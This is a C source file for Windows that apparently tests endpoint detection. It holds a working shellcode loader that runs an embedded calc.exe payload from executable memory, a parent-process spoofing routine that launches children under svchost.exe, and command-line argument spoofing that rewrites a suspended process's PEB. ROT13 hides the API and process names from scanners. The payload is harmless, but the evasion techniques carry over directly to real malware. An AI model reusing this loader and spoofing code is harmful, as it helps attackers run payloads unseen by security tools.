#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <winternl.h>
#include <psapi.h>

#pragma warning(disable:4996)



typedef NTSTATUS(NTAPI* fnNtQueryInformationProcess)(
    HANDLE           ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID            ProcessInformation,
    ULONG            ProcessInformationLength,
    PULONG           ReturnLength
    );



//Helpers
void rot13(char* str) {
    // Check if the input string is NULL to prevent dereferencing a null pointer.
    if (str == NULL) {
        printf("Error: Input string is NULL.\n");
        return;
    }

    // Iterate through each character of the string until the null terminator is reached.
    for (int i = 0; str[i] != '\0'; i++) {
        char c = str[i]; // Get the current character.

        // Check if the character is an uppercase letter (A-Z).
        if (c >= 'A' && c <= 'Z') {
            // Apply ROT13: (character - 'A' + 13) % 26 + 'A'
            str[i] = ((c - 'A' + 13) % 26) + 'A';
        }
        // Check if the character is a lowercase letter (a-z).
        else if (c >= 'a' && c <= 'z') {
            // Apply ROT13: (character - 'a' + 13) % 26 + 'a'
            // This formula shifts the character by 13 positions within the alphabet
            // and wraps around if it goes past 'z'.
            str[i] = ((c - 'a' + 13) % 26) + 'a';
        }
        // If the character is not an English letter, it remains unchanged.
    }
}
void w_rot13(wchar_t* str) {
    // Check if the input string is NULL to prevent dereferencing a null pointer.
    if (str == NULL) { // Using nullptr is C++11 and later preferred over NULL
        wprintf(L"Error: Input string is NULL.\n");
        return;
    }

    // Iterate through each character of the string until the null terminator is reached.
    for (int i = 0; str[i] != L'\0'; i++) {
        wchar_t c = str[i]; // Get the current wide character.

        // Check if the character is an uppercase letter (A-Z).
        if (c >= L'A' && c <= L'Z') {
            // Apply ROT13: (character - 'A' + 13) % 26 + 'A'
            str[i] = ((c - L'A' + 13) % 26) + L'A';
        }
        // Check if the character is a lowercase letter (a-z).
        else if (c >= L'a' && c <= L'z') {
            // Apply ROT13: (character - 'a' + 13) % 26 + L'a';
            str[i] = ((c - L'a' + 13) % 26) + L'a';
        }
        // If the character is not an English letter, it remains unchanged.
    }
}
LPWSTR ConvertUtf8LPSTRToLPWSTR(LPSTR lpstrUtf8Input) {
    if (lpstrUtf8Input == NULL) {
        return NULL;
    }

    // 1. Determine the required buffer size for the wide character string (UTF-16)
    // Pass CP_UTF8 as the CodePage to tell the function the input is UTF-8.
    // -1 for cchMultiByte indicates a null-terminated string.
    int required_wchars = MultiByteToWideChar(
        CP_UTF8,          // Source string is UTF-8
        0,                // dwFlags (0 for default behavior)
        lpstrUtf8Input,   // The UTF-8 LPSTR input string
        -1,               // Input string is null-terminated
        NULL,             // Output buffer (NULL to get required size)
        0                 // Size of output buffer (0 to get required size)
    );

    if (required_wchars == 0) {
        // MultiByteToWideChar returns 0 on failure. Get the error code.
        DWORD error = GetLastError();
        //fprintf(stderr, "Error determining required wide char length (Error: %lu)\n", error);
        return NULL;
    }

    // 2. Allocate memory for the wide character string.
    // required_wchars already includes the null terminator when -1 is used for input length.
    LPWSTR lpwszOutput = (LPWSTR)malloc(required_wchars * sizeof(WCHAR)); // WCHAR is wchar_t
    if (lpwszOutput == NULL) {
        //perror("Failed to allocate memory for LPWSTR");
        return NULL;
    }

    // 3. Perform the conversion from UTF-8 to UTF-16
    int converted_wchars = MultiByteToWideChar(
        CP_UTF8,          // Source string is UTF-8
        0,                // dwFlags
        lpstrUtf8Input,   // The UTF-8 LPSTR input string
        -1,               // Input string is null-terminated
        lpwszOutput,      // Output buffer
        required_wchars   // Size of output buffer (in WCHARs)
    );

    if (converted_wchars == 0) {
        DWORD error = GetLastError();
        //fprintf(stderr, "Error converting LPSTR (UTF-8) to LPWSTR (UTF-16) (Error: %lu)\n", error);
        free(lpwszOutput); // Free allocated memory on failure
        return NULL;
    }

    return lpwszOutput;
}
BOOL ReadFromTargetProcess(IN HANDLE hProcess, IN PVOID pAddress, OUT PVOID* ppReadBuffer, IN DWORD dwBufferSize) {

    SIZE_T	sNmbrOfBytesRead = NULL;

    *ppReadBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwBufferSize);

    if (!ReadProcessMemory(hProcess, pAddress, *ppReadBuffer, dwBufferSize, &sNmbrOfBytesRead) || sNmbrOfBytesRead != dwBufferSize) {
        MessageBoxA(NULL, "Reading from mem failed...", NULL, MB_OK);
        return FALSE;
    }

    return TRUE;
}
BOOL WriteToTargetProcess(IN HANDLE hProcess, IN PVOID pAddressToWriteTo, IN PVOID pBuffer, IN DWORD dwBufferSize) {

    SIZE_T sNmbrOfBytesWritten = NULL;

    if (!WriteProcessMemory(hProcess, pAddressToWriteTo, pBuffer, dwBufferSize, &sNmbrOfBytesWritten) || sNmbrOfBytesWritten != dwBufferSize) {
        MessageBoxA(NULL, "Writing to mem failed", NULL, MB_OK);
        return FALSE;
    }

    return TRUE;
}

//Github
// https://github.com/keks411/SimpleCrypter
// https://github.com/keks411/ShellcodeLoader
// https://github.com/keks411/ShellcodeLoaderDll





BOOL CreateSpoofedProc(IN LPCSTR lpApplicationName, IN LPSTR lpCommandLine, IN BOOL SpoofArgs) {

    DWORD		                       adwProcesses[1024 * 2],
        dwReturnLen1 = NULL,
        dwReturnLen2 = NULL,
        dwNmbrOfPids = NULL;
    HANDLE		                       hProcess = NULL;
    HMODULE		                       hModule = NULL;
    WCHAR		                       szProc[MAX_PATH];
    wchar_t                            szProcName[] = L"fipubfg.rkr"; //svchost.exe
    SIZE_T                             sThreadAttList = NULL;
    PPROC_THREAD_ATTRIBUTE_LIST        pThreadAttList = NULL;
    STARTUPINFOEXA                     SiEx = { 0 };
    PROCESS_INFORMATION                Pi = { 0 };




    RtlSecureZeroMemory(&SiEx, sizeof(STARTUPINFOEXA));
    RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
    SiEx.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    char szFullPath[MAX_PATH];
    GetSystemDirectoryA(szFullPath, MAX_PATH); // Get C:\Windows\System32

    //rotate stuff
    w_rot13(szProcName);

    if (!EnumProcesses(adwProcesses, sizeof(adwProcesses), &dwReturnLen1)) {
        MessageBoxA(NULL, "Enum failed...", "Error", MB_OK | MB_ICONERROR);
        return FALSE;
    }

    dwNmbrOfPids = dwReturnLen1 / sizeof(DWORD);

    for (int i = 0; i < dwNmbrOfPids; i++) {

        if (adwProcesses[i] != NULL) {

            if ((hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, adwProcesses[i])) != NULL) {
                if (!EnumProcessModules(hProcess, &hModule, sizeof(HMODULE), &dwReturnLen2)) {
                    MessageBoxA(NULL, "Enum procs failed...", "Error", MB_OK | MB_ICONERROR);
                }
                else {
                    if (!GetModuleBaseName(hProcess, hModule, szProc, sizeof(szProc) / sizeof(WCHAR))) {
                        MessageBoxA(NULL, "Getting base failed...", "Error", MB_OK | MB_ICONERROR);
                    }
                    else {
                        if (wcscmp(szProcName, szProc) == 0) {
                            //was able to obtain handle and base
                            char buffer[MAX_PATH];
                            sprintf_s(buffer, sizeof(buffer), "Found process: %ls with PID: %lu", szProc, adwProcesses[i]);
                            MessageBoxA(NULL, buffer, "Process Found", MB_OK | MB_ICONINFORMATION);

                            //Get Process ready
                            char szProccName[] = "fipubfg.rkr"; //svchost.exe
                            char sys32[] = "P:\\Jvaqbjf\\flfgrz32\\"; //C:\windows\systm32
                            rot13(szProccName);
                            rot13(sys32);
                            strcat_s(szFullPath, MAX_PATH, szProccName);

                            //Initialize prc list
                            InitializeProcThreadAttributeList(NULL, 1, NULL, &sThreadAttList);
                            pThreadAttList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sThreadAttList);
                            InitializeProcThreadAttributeList(pThreadAttList, 1, NULL, &sThreadAttList);
                            UpdateProcThreadAttribute(pThreadAttList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProcess, sizeof(HANDLE), NULL, NULL);
                            SiEx.lpAttributeList = pThreadAttList;



                            //Check for SpoofedArgs or not
                            if (SpoofArgs == FALSE) {
                                //Create the process
                                //Also set Currecnt Directory to system32 for little more opsec
                                //NOT spoofing args
                                if (!CreateProcessA(lpApplicationName, lpCommandLine, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, sys32, &SiEx.StartupInfo, &Pi)) {
                                    char errorMessage[256];
                                    sprintf_s(errorMessage, sizeof(errorMessage), "Failed to create process. Error: %lu", GetLastError());
                                    MessageBoxA(NULL, errorMessage, "Error", MB_OK | MB_ICONERROR);
                                    return FALSE;
                                }

                                WaitForSingleObject(Pi.hProcess, INFINITE);
                                break;
                            }
                            else {
                                //Spoofing args
                                // Getting the address of the NtQueryInformationProcess function
                                char szProcess[250];
                                wchar_t ntdll[] = L"AGQYY";
                                char ntquery[] = "AgDhrelVasbezngvbaCebprff";
                                rot13(ntquery);
                                w_rot13(ntdll);
                                fnNtQueryInformationProcess pNtQueryInformationProcess = (fnNtQueryInformationProcess)GetProcAddress(GetModuleHandleW(ntdll), ntquery);

                                //create random garbage
                                char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
                                int charset_size = sizeof(charset) - 1;
                                for (int i = 0; i < 249; i++) {
                                    int index = rand() % charset_size;
                                    szProcess[i] = charset[index];
                                }
                                szProcess[249] = L"\0";

                                //CreateProcess with spoofed garbage args
                                CreateProcessA(lpApplicationName, szProcess, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, sys32, &SiEx.StartupInfo, &Pi);

                                //Correcting the fucked up args
                                NTSTATUS STATUS = NULL;
                                PROCESS_BASIC_INFORMATION PBI = { 0 };
                                ULONG uRetern = NULL;
                                PPEB                          pPeb = NULL;
                                PRTL_USER_PROCESS_PARAMETERS  pParms = NULL;

                                if ((STATUS = pNtQueryInformationProcess(Pi.hProcess, ProcessBasicInformation, &PBI, sizeof(PROCESS_BASIC_INFORMATION), &uRetern)) != 0) {
                                    return FALSE;
                                }

                                if (!ReadFromTargetProcess(Pi.hProcess, PBI.PebBaseAddress, &pPeb, sizeof(PEB))) {
                                    return FALSE;
                                }
                                if (!ReadFromTargetProcess(Pi.hProcess, pPeb->ProcessParameters, &pParms, sizeof(RTL_USER_PROCESS_PARAMETERS) + 0xFF)) {
                                    return FALSE;
                                }

                                //encoding stuff
                                LPWSTR wcLpCmdLine = ConvertUtf8LPSTRToLPWSTR(lpCommandLine);


                                if (!WriteToTargetProcess(Pi.hProcess, (PVOID)pParms->CommandLine.Buffer, (PVOID)wcLpCmdLine, (DWORD)(lstrlenW(wcLpCmdLine) * sizeof(WCHAR) + 1))) {
                                    return FALSE;
                                }


                                // Cleaning up
                                HeapFree(GetProcessHeap(), NULL, pPeb);
                                HeapFree(GetProcessHeap(), NULL, pParms);

                                // Resuming the process with the new paramters
                                ResumeThread(Pi.hThread);
                                break;
                            }



                        }
                    }
                }

                CloseHandle(hProcess);
            }
        }
    }
}






int main()
{
    // 1
    BOOL one = FALSE;
    if (one == FALSE) {
        MessageBoxA(NULL, "This is a malicious message box!", "mimikatz.exe", MB_OK);
    }
    else {
        char message[] = "zvzvxngm.rkr";
        rot13(message);
        MessageBoxA(NULL, "This is a malicious message box!", message, MB_OK);
    }

    // 2
    BOOL two = FALSE;
    if (two == FALSE) {
        unsigned char shellCode[] =
            "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
            "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
            "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
            "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
            "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
            "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
            "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
            "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
            "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
            "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
            "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
            "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
            "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
            "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
            "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
            "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
            "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
            "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
            "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
            "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

        HANDLE hVirtualAlloc;
        SIZE_T  dwSize = sizeof(shellCode);

        // Allocate memory for the shellcode
        if ((hVirtualAlloc = VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL) {
            return;
        }
        else {
        }

        // Copy shellcode into allocated memory
        if (memcpy(hVirtualAlloc, shellCode, dwSize) == NULL) {
            return;
        }
        else {
        }

        // Create a thread to execute the shellcode
        HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)hVirtualAlloc, NULL, 0, NULL);
        if (hThread == NULL) {
            return;
        }
        else {
        }

    }
    else {
        CreateSpoofedProc("C:\\Windows\\System32\\notepad.exe", "C:\\Windows\\System32\\calc.exe", TRUE);
	}
    


}
